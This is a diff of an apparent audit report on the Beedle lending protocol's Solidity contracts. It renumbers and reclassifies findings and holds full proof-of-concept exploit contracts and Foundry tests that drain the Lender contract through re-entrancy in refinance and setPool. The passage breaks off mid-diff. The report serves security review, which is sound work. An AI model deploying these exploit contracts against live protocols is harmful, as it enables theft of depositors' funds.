@@ -30,15 +30,17 @@ Before diving into the codebase and this implementation of the Blend lending pro
 |:--|:--|:--:|
 | High | `borrow` function can be frontrun by lender to put `auctionLength` to 1 | [H-01] |
 | High | Contract can be drained by lack of pool ownership check in `buyLoan` | [H-02] |
-| High | `Contract can be drained by lack of token address check in `buyLoan` | [H-03] |
-| High | `Lender` contract can be drained by re-entrancy in `refinance` (collateral) | [H-04] |
-| High | `Lender` contract can be drained by re-entrancy in `refinance` (debt) | [H-05] |
-| High | `Lender` contract can be drained by re-entrancy in `repay` | [H-06] |
-| High | `Lender` contract can be drained by re-entrancy in `seizeLoan` | [H-07] |
-| High | `Lender` contract can be drained by re-entrancy in `setPool` | [H-08] |
-| High | Lender loses money when a loan is refinanced | [H-09] |
-| High | `sellProfits` function does not work because of lack of approved tokens | [H-10] |
-| Medium | Borrower can reset auction to not get liquidated | [M-01] |
+| High | Contract can be drained by lack of token address check in `buyLoan` | [H-03] |
+| High | `Lender` contract can be drained by re-entrancy in `repay` **SELECTED** | [H-04] |
+| High | Borrower can reset auction to not get liquidated | [H-05] |
+| High | `Lender` contract can be drained by re-entrancy in `setPool` **SELECTED**| [H-06] |
+| High | Lender loses money when a loan is refinanced | [H-07] |
+| High | `sellProfits` function does not work because of lack of approved tokens | [H-8] |
+| Medium | `Lender` contract can be drained by re-entrancy in `seizeLoan` **SELECTED**| [M-01] |
+| Medium | `Lender` contract can be drained by re-entrancy in `refinance` (collateral) **SELECTED** | [M-02] |
+| Medium | `Lender` contract can be drained by re-entrancy in `refinance` (debt) | [M-02-bis] |
+
+**SELECTED** means that among all the duplicates the issue got selected for the [official report](https://www.codehawks.com/report/clkbo1fa20009jr08nyyf9wbx) because it was the most explanatory.
 
 # [H-01] - `borrow` function can be frontrun by lender to put `auctionLength` to 1
 
@@ -314,352 +316,7 @@ if (pool.loanToken != loan.loanToken || pool.collateralToken != loan.collateralT
 	revert WrongTokens();
 ```
 
-
-# [H-04] - `Lender` contract can be drained by re-entrancy in `refinance` (collateral)
-## Summary
-Tokens allowing reentrant calls on transfer can be drained from a pool.
-
-## Vulnerability Details
-Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
-Example of token with hook on transfer:
-```solidity
-pragma solidity ^0.8.19;
-
-import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
-
-contract WeirdToken is ERC20 {
-
-    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
-        _mint(msg.sender, amount);
-    }
-
-    // Hook on token transfer
-    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
-        if (to != address(0)) {
-            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
-        }
-    }
-}
- ```
-This kind of token allows a re-entrancy attack in the `refinance` function. When the new `collateral` is less than the current loan collateral, the difference is sent to the borrower before updating the state.
-```solidity
-File: Lender.Sol
-
-L668:	} else if (collateral < loan.collateral) {
-		// transfer the collateral tokens from the contract to the borrower
-		IERC20(loan.collateralToken).transfer(
-			msg.sender,
-			loan.collateral - collateral
-		); // @audit - Re-entrancy can drain contract
-	}
-```
-https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L670
-
-
-## Impact
-### POC
-An attacker can use the following exploit contract to drain the `lender` contract:
-```solidity
-File: Exploit1.sol
-
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
-
-import {WeirdToken} from "./WeirdToken.sol";
-import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
-import "../utils/Structs.sol";
-import "../Lender.sol";
-
-contract Exploit1  {
-    Lender lender;
-    address loanToken;
-    address collateralToken;
-    Refinance refinance;
-
-    constructor(Lender _lender, address _loanToken, address _collateralToken) {
-        lender = _lender;
-        loanToken = _loanToken;
-        collateralToken = _collateralToken;
-    }
-
-    function attack(bytes32 _poolId, uint256 _debt, uint256 _collateral, uint256 _loanId, uint256 _newCollateral) external {
-        // [1] Borrow a new loan
-        ERC20(collateralToken).approve(address(lender), _collateral);
-        Borrow memory b = Borrow({
-            poolId: _poolId,
-            debt: _debt,
-            collateral: _collateral
-        });
-        Borrow[] memory borrows = new Borrow[](1);
-        borrows[0] = b;        
-        lender.borrow(borrows);
-        // [2] Refinance the loan with a lower amount of collateral
-        refinance = Refinance({
-            loanId: _loanId,
-            poolId: _poolId,
-            debt: _debt,
-            collateral: _newCollateral
-        });
-        Refinance[] memory refinances = new Refinance[](1);
-        refinances[0] = refinance;
-        lender.refinance(refinances);
-        // [3] Send the funds back to the attacker
-        ERC20(loanToken).transfer(msg.sender, ERC20(loanToken).balanceOf(address(this)));
-        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));
-    }
-
-    function tokensReceived(address from, address /*to*/, uint256 amount) external {
-        require(msg.sender == collateralToken, "not collateral token");
-        if (from == address(lender)) {
-            uint256 lenderBalance = ERC20(collateralToken).balanceOf(address(lender));
-            if (lenderBalance > 0) {
-                // Re-enter
-                Refinance[] memory refinances = new Refinance[](1);
-                if (lenderBalance >= amount) {
-                    refinances[0] = refinance;
-                } else {
-                    Refinance memory r = refinance;
-                    r.collateral += amount - lenderBalance;
-                    refinances[0] = r;
-                }
-                lender.refinance(refinances);
-            }          
-        }
-    }
-
-}
-```
-Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
-```solidity
-function test_exploit() public {
-    address attacker = address(0x5);
-    // Setup
-    vm.startPrank(lender1);
-    WeirdToken weirdToken = new WeirdToken(1_000_000*10**18);
-    weirdToken.transfer(address(lender), 900_000*10**18); // Lender contract has 900_000 weirdToken
-    weirdToken.transfer(address(attacker), 100_000*10**18); // Attacker has 100_000 weirdToken
-    // lender1 creates a pool of loanTokens accepting weirdTokens as collateral
-    Pool memory p = Pool({
-        lender: lender1,
-        loanToken: address(loanToken),
-        collateralToken: address(weirdToken),
-        minLoanSize: 10*10**18,
-        poolBalance: 1000*10**18,
-        maxLoanRatio: 2*10**18,
-        auctionLength: 1 days,
-        interestRate: 1000,
-        outstandingLoans: 0
-    });
-    bytes32 poolId = lender.setPool(p);
-
-    assertEq(weirdToken.balanceOf(address(lender)), 900_000*10**18);
-    assertEq(loanToken.balanceOf(address(lender)), 1_000*10**18);
-    assertEq(weirdToken.balanceOf(address(attacker)), 100_000*10**18);  // Attacker starts with some weirdTokens        
-    assertEq(loanToken.balanceOf(address(attacker)), 0);
-
-    // Exploit starts here
-    vm.startPrank(attacker);
-    Exploit1 attackContract = new Exploit1(lender, address(loanToken), address(weirdToken));
-    weirdToken.transfer(address(attackContract), 100_000*10**18);
-    uint256 debt = 10*10**18;
-    uint256 collateral = 100_000*10**18;
-    uint256 loanId = 0;
-    uint256 newCollateral = 10*10**18;
-    attackContract.attack(poolId, debt, collateral, loanId, newCollateral);
-
-    // Pool has been drained
-    assertEq(weirdToken.balanceOf(address(lender)), 0);
-    assertLt(loanToken.balanceOf(address(lender)), 1_000*10**18);        // Pool has a debt
-    assertEq(weirdToken.balanceOf(address(attacker)), 1_000_000*10**18); // Attacker has drained all the weirdTokens   
-    assertGt(loanToken.balanceOf(address(attacker)), 0);                 // Attacker keeps the loan tokens
-}
-```
-
-## Tools Used
-Manual review + Foundry
-
-## Recommendations
-Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the loan variables before transfering the funds AND use nonReentrant modifiers
-
-
-
-# [H-05] - `Lender` contract can be drained by re-entrancy in `refinance` (debt)
-
-
-## Summary
-Tokens allowing reentrant calls on transfer can be drained from a pool.
-
-## Vulnerability Details
-Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
-Example of token with hook on transfer:
-```solidity
-pragma solidity ^0.8.19;
-
-import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
-
-contract WeirdToken is ERC20 {
-
-    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
-        _mint(msg.sender, amount);
-    }
-
-    // Hook on token transfer
-    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
-        if (to != address(0)) {
-            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
-        }
-    }
-}
- ```
-This kind of token allows a re-entrancy attack in the `refinance` function. When the new `debt` is more than the current loan debt, the difference is sent to the borrower before updating the state.
-```solidity
-File: Lender.Sol
-
-L647:	} else if (debtToPay < debt) {
- 		// we have excess loan tokens so we give some back to the borrower
-		// first we take our borrower fee
-		uint256 fee = (borrowerFee * (debt - debtToPay)) / 10000;
-		IERC20(loan.loanToken).transfer(feeReceiver, fee);
-		// transfer the loan tokens from the contract to the borrower
-		IERC20(loan.loanToken).transfer(msg.sender, debt - debtToPay - fee); // @audit - Re-entrancy can drain pool
-	}
-```
-https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L653
-
-
-## Impact
-### POC
-An attacker can use the following exploit contract to drain the `lender` contract:
-```solidity
-File: Exploit2.sol
-
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.19;
-
-import {WeirdToken} from "./WeirdToken.sol";
-import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
-import "../utils/Structs.sol";
-import "../Lender.sol";
-
-contract Exploit2  {
-    Lender lender;
-    address loanToken;
-    address collateralToken;
-    bool borrowed;
-    Refinance refinance;
-    uint256 i;
-
-    constructor(Lender _lender, address _loanToken, address _collateralToken) {
-        lender = _lender;
-        loanToken = _loanToken;
-        collateralToken = _collateralToken;
-    }
-
-    function attack(bytes32 _poolId, uint256 _debt, uint256 _collateral, uint256 _loanId, uint256 _newDebt) external {
-        // [1] Borrow a new loan
-        ERC20(collateralToken).approve(address(lender), _collateral);
-        Borrow memory b = Borrow({
-            poolId: _poolId,
-            debt: _debt,
-            collateral: _collateral
-        });
-        Borrow[] memory borrows = new Borrow[](1);
-        borrows[0] = b;        
-        lender.borrow(borrows);
-        borrowed = true;
-        // [2] Refinance the loan with a higher amount of debt
-        refinance = Refinance({
-            loanId: _loanId,
-            poolId: _poolId,
-            debt: _newDebt,
-            collateral: _collateral
-        });
-        Refinance[] memory refinances = new Refinance[](1);
-        refinances[0] = refinance;
-        lender.refinance(refinances);
-        // [3] Repay the loan
-        ERC20(loanToken).approve(address(lender), _newDebt);
-        uint256[] memory loanIds = new uint256[](1);
-        loanIds[0] = _loanId;
-        lender.repay(loanIds);
-        // [4] Send the funds back to the attacker
-        ERC20(loanToken).transfer(msg.sender, ERC20(loanToken).balanceOf(address(this)));
-        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));
-    }
-
-    function tokensReceived(address from, address /*to*/, uint256 /*amount*/) external {
-        require(msg.sender == loanToken, "not collateral token");
-        if (from == address(lender) && borrowed) {
-            // Re-enter 4 times
-            if (i < 4) {
-                i = i + 1;
-                Refinance[] memory refinances = new Refinance[](1);
-                refinances[0] = refinance;
-                lender.refinance(refinances);                
-            }            
-        }
-    }
-
-}
-```
-Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
-```solidity
-function test_exploit() public {
-    // Setup
-    address attacker = address(0x5);
-    collateralToken.mint(address(attacker), 100*10**18); 
-    
-    vm.startPrank(lender1);
-    WeirdToken weirdToken = new WeirdToken(1_000*10**18); 
-    weirdToken.approve(address(lender), 1_000*10**18);
-    // lender1 creates a pool of weirdTokens accepting collateralToken as collateral
-    Pool memory p = Pool({
-        lender: lender1,
-        loanToken: address(weirdToken),
-        collateralToken: address(collateralToken),
-        minLoanSize: 10*10**18,
-        poolBalance: 1000*10**18,
-        maxLoanRatio: 2*10**18,
-        auctionLength: 1 days,
-        interestRate: 1000,
-        outstandingLoans: 0
-    });
-    bytes32 poolId = lender.setPool(p);
-
-    // Before the exploit
-    assertEq(collateralToken.balanceOf(address(lender)), 0);
-    assertEq(weirdToken.balanceOf(address(lender)), 1_000*10**18);      // Lender has 1_000 weirdTokens to lend
-    assertEq(collateralToken.balanceOf(address(attacker)), 100*10**18); // Attacker has 100 collateral tokens  
-    assertEq(weirdToken.balanceOf(address(attacker)), 0);               // Attacker has no weirdTokens
-
-    // Exploit starts here
-    vm.startPrank(attacker);
-    Exploit2 attackContract = new Exploit2(lender, address(weirdToken), address(collateralToken));
-    collateralToken.transfer(address(attackContract), 100*10**18);
-    uint256 debt = 10*10**18;
-    uint256 collateral = 100*10**18;
-    uint256 loanId = 0;
-    uint256 newDebt = 100*10**18;
-    attackContract.attack(poolId, debt, collateral, loanId, newDebt);
-
-    // After the exploit
-    assertEq(collateralToken.balanceOf(address(lender)), 0);
-    assertLt(weirdToken.balanceOf(address(lender)), 650*10**18);        // Pool lost some weirdTokens
-    assertEq(collateralToken.balanceOf(address(attacker)), 100*10**18); // Attacker keept his collateralTokens
-    assertGt(weirdToken.balanceOf(address(attacker)), 350*10**18);      // Attacker stole some weirdTokens
-}
-```
-
-## Tools Used
-Manual review + Foundry
-
-## Recommendations
-Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the loan debt before transfering the excess loan tokens AND use nonReentrant modifiers
-
-
-# [H-06] - `Lender` contract can be drained by re-entrancy in `repay`
-
-
+# [H-04] - `Lender` contract can be drained by re-entrancy in `repay` **SELECTED**
 ## Summary
 An attacker can craft a token allowing reentrant calls on transfer to drain any token from the `Lender` contract.
 
@@ -845,9 +502,244 @@ Manual review + Foundry
 Follow the _Checks - Effect - Interactions_ (CEI) pattern by deleting the loan `loans[loanId]` before transfering the funds AND use nonReentrant modifiers
 
 
-# [H-07] - `Lender` contract can be drained by re-entrancy in `seizeLoan`
+# [H-05] - Borrower can reset auction to not get liquidated
+## Summary
+Any ongoing auction is reset if the borrower calls the `refinance` function. Thus, a borrower can stop a refinancing auction to prevent him from being liquidated.
+
+## Vulnerability Details
+When calling the `refinance` function the `loans[loanId].auctionStartTimestamp` is reset to `type(uint256).max` which resets any ongoing auction.
+
+```solidity
+File: Lender.sol
+
+L691:	// update loan auction start timestamp
+	loans[loanId].auctionStartTimestamp = type(uint256).max; // @audit - Can reset auction
+```
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L692
+
+## Impact
+An insolvent borrower can indefinitely maintain his position by calling the `refinance` function, with or without updating any loan parameter.
+
+## Tools Used
+Manual review
+
+## Recommendations
+`loans[loanId].auctionStartTimestamp` should only be reset if the pool `maxLoanRatio` is met.
+
+# [H-06] - `Lender` contract can be drained by re-entrancy in `setPool` **SELECTED**
+## Summary
+Tokens allowing reentrant calls on transfer can be drained from the contract.
+
+## Vulnerability Details
+Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
+Example of token with hook on transfer:
+```solidity
+pragma solidity ^0.8.19;
+
+import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
+
+contract WeirdToken is ERC20 {
+
+    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
+        _mint(msg.sender, amount);
+    }
+
+    // Hook on token transfer
+    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
+        if (to != address(0)) {
+            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
+        }
+    }
+}
+ ```
+This kind of token allows a re-entrancy attack in the `setPool` function. When the new `p.poolBalance` is less than the `currentBalance`, the difference is sent to the borrower before updating the state.
+```solidity
+File: Lender.sol
+
+L157:	} else if (p.poolBalance < currentBalance) {
+            // if new balance < current balance then transfer the difference back to the lender
+            IERC20(p.loanToken).transfer( // @audit - Critical Re-entrancy can drain contract
+                p.lender,
+                currentBalance - p.poolBalance
+            );
+        }
+```
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L159
 
 
+## Impact
+### POC
+An attacker can use the following exploit contract to drain the `lender` contract:
+```solidity
+File: Exploit3.sol
+
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.19;
+
+import {WeirdToken} from "./WeirdToken.sol";
+import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
+import "../utils/Structs.sol";
+import "../Lender.sol";
+
+contract Exploit3  {
+    Lender lender;
+    Pool pool;
+
+    constructor(Lender _lender) {
+        lender = _lender;
+    }
+
+    function attack(address _loanToken, uint256 _poolBalance) external {
+        ERC20(_loanToken).approve(address(lender), _poolBalance);
+        // [1] Create a new pool
+        Pool memory p = Pool({
+            lender: address(this),
+            loanToken: _loanToken,
+            collateralToken: address(0),
+            minLoanSize: 10*10**18,
+            poolBalance: _poolBalance,
+            maxLoanRatio: 2*10**18,
+            auctionLength: 1 days,
+            interestRate: 1000,
+            outstandingLoans: 0
+        });
+        lender.setPool(p);
+        // [2] Update pool with 0 poolBalance
+        p.poolBalance = 0;
+        pool = p;
+        lender.setPool(p);
+        // [3] Send the funds back to the attacker
+        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
+    }
+
+    function tokensReceived(address from, address /*to*/, uint256 amount) external {
+        Pool memory p = pool;
+        require(msg.sender == p.loanToken, "not collateral token");
+        if (from == address(lender)) {
+            uint256 lenderBalance = ERC20(p.loanToken).balanceOf(address(lender));
+            if (lenderBalance > 0) {
+                // Re-enter
+                if (lenderBalance < amount) {
+                    p.poolBalance = amount - lenderBalance;
+                }
+                lender.setPool(p);
+            }          
+        }
+    }
+
+}
+```
+Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
+```solidity
+function test_exploit() public {
+	// Setup
+	address attacker = address(0x5); 
+	WeirdToken weirdToken = new WeirdToken(10_500*10**18); 
+	weirdToken.transfer(address(lender), 9_500*10**18);
+	weirdToken.transfer(address(attacker), 1_000*10**18);
+
+	// Before the exploit
+	assertEq(weirdToken.balanceOf(address(lender)), 9_500*10**18);      // Lender contract has 9_500 weirdToken
+	assertEq(weirdToken.balanceOf(address(attacker)), 1_000*10**18);    // Attacker has 1_000 weirdToken
+
+	// Exploit starts here
+	vm.startPrank(attacker);
+	Exploit3 attackContract = new Exploit3(lender);
+	weirdToken.transfer(address(attackContract), 1_000*10**18);
+	attackContract.attack(address(weirdToken), 1_000*10**18);
+
+	// After the exploit
+	assertEq(weirdToken.balanceOf(address(lender)), 0);                 // Lender contract has been drained
+	assertEq(weirdToken.balanceOf(address(attacker)), 10_500*10**18);   // Attacker stole all the tokens
+}
+```
+
+## Tools Used
+Manual review + Foundry
+
+## Recommendations
+Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the pools mapping (Line 175) before transfering the funds AND use nonReentrant modifiers
+
+
+# [H-07] - Lender loses money when a loan is refinanced
+## Summary
+The updated `debt` of a loan is removed twice from the `poolBalance` when a loan is refined by the `refinance` function.
+
+## Vulnerability Details
+In the `refinance` function the new `debt` is substracted twice from the `pools[poolId].poolBalance`. This leads to `poolBalance` being underestimated and so the lender can not withdraw their tokens anymore, funds are locked in the contract.
+
+```solidity
+File: Lender.sol
+
+L635:	// now lets deduct our tokens from the new pool
+	_updatePoolBalance(poolId, pools[poolId].poolBalance - debt);
+
+// [...]
+
+L697:	// update pool balance
+	pools[poolId].poolBalance -= debt; // @audit - [CRITICAL] Debt is removed for the second time
+```
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L636
+
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L698
+
+## Impact
+Funds can be locked in the contract after a refinancing. In addition, borrower is not able to `refinance` if they own more than the half of the pool because the second `poolBalance` update will underflow.
+
+## Tools Used
+Manual review
+
+## Recommendations
+Remove the second `poolBalance` update at line 698.
+
+
+# [H-08] - `sellProfits` function does not work because of lack of approved tokens
+## Summary
+The `sellProfits` function cannot swap tokens as intended because the `IERC20(_profits)` tokens are not approved by the contract.
+
+## Vulnerability Details
+The `swapRouter.exactInputSingle(params)` call will always fail because the `swapRouter` did not receive allowance to spend the `_profits` tokens.
+
+```solidity
+File: Fees.sol
+
+L26:	function sellProfits(address _profits) public {
+        require(_profits != WETH, "not allowed");
+        uint256 amount = IERC20(_profits).balanceOf(address(this));
+        // @audit - Lack of approve token
+        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
+            .ExactInputSingleParams({
+                tokenIn: _profits,
+                tokenOut: WETH,
+                fee: 3000,
+                recipient: address(this),
+                deadline: block.timestamp,
+                amountIn: amount,
+                amountOutMinimum: 0,
+                sqrtPriceLimitX96: 0
+            });
+
+        amount = swapRouter.exactInputSingle(params);
+        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
+    }
+```
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26
+
+## Impact
+Funds are locked in the contract and the `sellProfits` function will always revert.
+
+## Tools Used
+Manual review
+
+## Recommendations
+Add a token `approve` before calling the Uniswap `exactInputSingle` function
+```solidity
+IERC20(_profits).approve(address(swapRouter), amount);
+```
+Unit tests should also be added.
+
+
+# [M-01] - `Lender` contract can be drained by re-entrancy in `seizeLoan` **SELECTED**
 ## Summary
 Tokens allowing reentrant calls on transfer can be drained from the contract.
 
@@ -1036,11 +928,9 @@ Manual review + Foundry
 Follow the _Checks - Effect - Interactions_ (CEI) pattern by performing the token transfers at the end of the `seizeLoan` function AND use nonReentrant modifiers
 
 
-# [H-08] - `Lender` contract can be drained by re-entrancy in `setPool`
-
-
+# [M-02] - `Lender` contract can be drained by re-entrancy in `refinance` (collateral) **SELECTED**
 ## Summary
-Tokens allowing reentrant calls on transfer can be drained from the contract.
+Tokens allowing reentrant calls on transfer can be drained from a pool.
 
 ## Vulnerability Details
 Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
@@ -1064,26 +954,26 @@ contract WeirdToken is ERC20 {
     }
 }
  ```
-This kind of token allows a re-entrancy attack in the `setPool` function. When the new `p.poolBalance` is less than the `currentBalance`, the difference is sent to the borrower before updating the state.
+This kind of token allows a re-entrancy attack in the `refinance` function. When the new `collateral` is less than the current loan collateral, the difference is sent to the borrower before updating the state.
 ```solidity
-File: Lender.sol
+File: Lender.Sol
 
-L157:	} else if (p.poolBalance < currentBalance) {
-            // if new balance < current balance then transfer the difference back to the lender
-            IERC20(p.loanToken).transfer( // @audit - Critical Re-entrancy can drain contract
-                p.lender,
-                currentBalance - p.poolBalance
-            );
-        }
+L668:	} else if (collateral < loan.collateral) {
+		// transfer the collateral tokens from the contract to the borrower
+		IERC20(loan.collateralToken).transfer(
+			msg.sender,
+			loan.collateral - collateral
+		); // @audit - Re-entrancy can drain contract
+	}
 ```
-https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L159
+https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L670
 
 
 ## Impact
 ### POC
 An attacker can use the following exploit contract to drain the `lender` contract:
 ```solidity
-File: Exploit3.sol
+File: Exploit1.sol
 
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.19;
@@ -1093,48 +983,59 @@ import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
 import "../utils/Structs.sol";
 import "../Lender.sol";
 
-contract Exploit3  {
+contract Exploit1  {
     Lender lender;
-    Pool pool;
+    address loanToken;
+    address collateralToken;
+    Refinance refinance;
 
-    constructor(Lender _lender) {
+    constructor(Lender _lender, address _loanToken, address _collateralToken) {
         lender = _lender;
+        loanToken = _loanToken;
+        collateralToken = _collateralToken;
     }
 
-    function attack(address _loanToken, uint256 _poolBalance) external {
-        ERC20(_loanToken).approve(address(lender), _poolBalance);
-        // [1] Create a new pool
-        Pool memory p = Pool({
-            lender: address(this),
-            loanToken: _loanToken,
-            collateralToken: address(0),
-            minLoanSize: 10*10**18,
-            poolBalance: _poolBalance,
-            maxLoanRatio: 2*10**18,
-            auctionLength: 1 days,
-            interestRate: 1000,
-            outstandingLoans: 0
+    function attack(bytes32 _poolId, uint256 _debt, uint256 _collateral, uint256 _loanId, uint256 _newCollateral) external {
+        // [1] Borrow a new loan
+        ERC20(collateralToken).approve(address(lender), _collateral);
+        Borrow memory b = Borrow({
+            poolId: _poolId,
+            debt: _debt,
+            collateral: _collateral
         });
-        lender.setPool(p);
-        // [2] Update pool with 0 poolBalance
-        p.poolBalance = 0;
-        pool = p;
-        lender.setPool(p);
+        Borrow[] memory borrows = new Borrow[](1);
+        borrows[0] = b;        
+        lender.borrow(borrows);
+        // [2] Refinance the loan with a lower amount of collateral
+        refinance = Refinance({
+            loanId: _loanId,
+            poolId: _poolId,
+            debt: _debt,
+            collateral: _newCollateral
+        });
+        Refinance[] memory refinances = new Refinance[](1);
+        refinances[0] = refinance;
+        lender.refinance(refinances);
         // [3] Send the funds back to the attacker
-        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
+        ERC20(loanToken).transfer(msg.sender, ERC20(loanToken).balanceOf(address(this)));
+        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));
     }
 
     function tokensReceived(address from, address /*to*/, uint256 amount) external {
-        Pool memory p = pool;
-        require(msg.sender == p.loanToken, "not collateral token");
+        require(msg.sender == collateralToken, "not collateral token");
         if (from == address(lender)) {
-            uint256 lenderBalance = ERC20(p.loanToken).balanceOf(address(lender));
+            uint256 lenderBalance = ERC20(collateralToken).balanceOf(address(lender));
             if (lenderBalance > 0) {
                 // Re-enter
-                if (lenderBalance < amount) {
-                    p.poolBalance = amount - lenderBalance;
+                Refinance[] memory refinances = new Refinance[](1);
+                if (lenderBalance >= amount) {
+                    refinances[0] = refinance;
+                } else {
+                    Refinance memory r = refinance;
+                    r.collateral += amount - lenderBalance;
+                    refinances[0] = r;
                 }
-                lender.setPool(p);
+                lender.refinance(refinances);
             }          
         }
     }
@@ -1144,25 +1045,46 @@ contract Exploit3  {
 Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
 ```solidity
 function test_exploit() public {
-	// Setup
-	address attacker = address(0x5); 
-	WeirdToken weirdToken = new WeirdToken(10_500*10**18); 
-	weirdToken.transfer(address(lender), 9_500*10**18);
-	weirdToken.transfer(address(attacker), 1_000*10**18);
+    address attacker = address(0x5);
+    // Setup
+    vm.startPrank(lender1);
+    WeirdToken weirdToken = new WeirdToken(1_000_000*10**18);
+    weirdToken.transfer(address(lender), 900_000*10**18); // Lender contract has 900_000 weirdToken
+    weirdToken.transfer(address(attacker), 100_000*10**18); // Attacker has 100_000 weirdToken
+    // lender1 creates a pool of loanTokens accepting weirdTokens as collateral
+    Pool memory p = Pool({
+        lender: lender1,
+        loanToken: address(loanToken),
+        collateralToken: address(weirdToken),
+        minLoanSize: 10*10**18,
+        poolBalance: 1000*10**18,
+        maxLoanRatio: 2*10**18,
+        auctionLength: 1 days,
+        interestRate: 1000,
+        outstandingLoans: 0
+    });
+    bytes32 poolId = lender.setPool(p);
 
-	// Before the exploit
-	assertEq(weirdToken.balanceOf(address(lender)), 9_500*10**18);      // Lender contract has 9_500 weirdToken
-	assertEq(weirdToken.balanceOf(address(attacker)), 1_000*10**18);    // Attacker has 1_000 weirdToken
+    assertEq(weirdToken.balanceOf(address(lender)), 900_000*10**18);
+    assertEq(loanToken.balanceOf(address(lender)), 1_000*10**18);
+    assertEq(weirdToken.balanceOf(address(attacker)), 100_000*10**18);  // Attacker starts with some weirdTokens        
+    assertEq(loanToken.balanceOf(address(attacker)), 0);
 
-	// Exploit starts here
-	vm.startPrank(attacker);
-	Exploit3 attackContract = new Exploit3(lender);
-	weirdToken.transfer(address(attackContract), 1_000*10**18);
-	attackContract.attack(address(weirdToken), 1_000*10**18);
+    // Exploit starts here
+    vm.startPrank(attacker);
+    Exploit1 attackContract = new Exploit1(lender, address(loanToken), address(weirdToken));
+    weirdToken.transfer(address(attackContract), 100_000*10**18);
+    uint256 debt = 10*10**18;
+    uint256 collateral = 100_000*10**18;
+    uint256 loanId = 0;
+    uint256 newCollateral = 10*10**18;
+    attackContract.attack(poolId, debt, collateral, loanId, newCollateral);
 
-	// After the exploit
-	assertEq(weirdToken.balanceOf(address(lender)), 0);                 // Lender contract has been drained
-	assertEq(weirdToken.balanceOf(address(attacker)), 10_500*10**18);   // Attacker stole all the tokens
+    // Pool has been drained
+    assertEq(weirdToken.balanceOf(address(lender)), 0);
+    assertLt(loanToken.balanceOf(address(lender)), 1_000*10**18);        // Pool has a debt
+    assertEq(weirdToken.balanceOf(address(attacker)), 1_000_000*10**18); // Attacker has drained all the weirdTokens   
+    assertGt(loanToken.balanceOf(address(attacker)), 0);                 // Attacker keeps the loan tokens
 }
 ```
 
@@ -1170,107 +1092,177 @@ function test_exploit() public {
 Manual review + Foundry
 
 ## Recommendations
-Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the pools mapping (Line 175) before transfering the funds AND use nonReentrant modifiers
+Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the loan variables before transfering the funds AND use nonReentrant modifiers
 
 
-# [H-09] - Lender loses money when a loan is refinanced
+# [M-02-bis] - `Lender` contract can be drained by re-entrancy in `refinance` (debt)
 ## Summary
-The updated `debt` of a loan is removed twice from the `poolBalance` when a loan is refined by the `refinance` function.
+Tokens allowing reentrant calls on transfer can be drained from a pool.
 
 ## Vulnerability Details
-In the `refinance` function the new `debt` is substracted twice from the `pools[poolId].poolBalance`. This leads to `poolBalance` being underestimated and so the lender can not withdraw their tokens anymore, funds are locked in the contract.
-
+Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
+Example of token with hook on transfer:
 ```solidity
-File: Lender.sol
